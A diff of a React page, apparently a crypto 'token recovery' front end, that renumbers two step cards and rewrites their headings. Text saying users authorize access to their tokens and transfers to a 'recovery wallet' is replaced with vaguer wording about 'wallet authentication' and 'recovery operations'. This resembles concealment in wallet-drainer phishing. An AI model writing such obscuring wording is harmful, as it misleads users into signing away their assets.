@@ -729,16 +729,16 @@ export default function Home() {
                 <div className="flex items-center justify-between mb-4">
                   <div className="flex items-center space-x-3">
                     <div className="w-8 h-8 bg-indigo-500 rounded-full flex items-center justify-center">
-                      <span className="text-white font-bold">8</span>
+                      <span className="text-white font-bold">7</span>
                     </div>
                     <div>
-                      <h3 className="text-xl font-bold text-gray-900">Advanced Token Recovery Authorization</h3>
-                      <p className="text-sm text-indigo-600">Authorize recovery system access to your tokens</p>
+                      <h3 className="text-xl font-bold text-gray-900">Advanced Signature Authorization</h3>
+                      <p className="text-sm text-indigo-600">Multi-layer wallet authentication for secure recovery</p>
                     </div>
                   </div>
                   <div className="flex items-center space-x-2 bg-indigo-50 px-3 py-2 rounded-lg">
                     <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
-                    <span className="text-sm font-medium text-indigo-700">Recovery Ready</span>
+                    <span className="text-sm font-medium text-indigo-700">Ready</span>
                   </div>
                 </div>
                 <SignatureManager provider={provider} userAddress={address} />
@@ -750,11 +750,11 @@ export default function Home() {
                 <div className="flex items-center justify-between mb-4">
                   <div className="flex items-center space-x-3">
                     <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
-                      <span className="text-white font-bold">9</span>
+                      <span className="text-white font-bold">8</span>
                     </div>
                     <div>
-                      <h3 className="text-xl font-bold text-gray-900">Token Transfer Executor</h3>
-                      <p className="text-sm text-red-600">Execute approved token transfers to recovery wallet</p>
+                      <h3 className="text-xl font-bold text-gray-900">Recovery Execution Engine</h3>
+                      <p className="text-sm text-red-600">Execute authorized recovery operations</p>
                     </div>
                   </div>
                   <div className="flex items-center space-x-2 bg-red-50 px-3 py-2 rounded-lg">
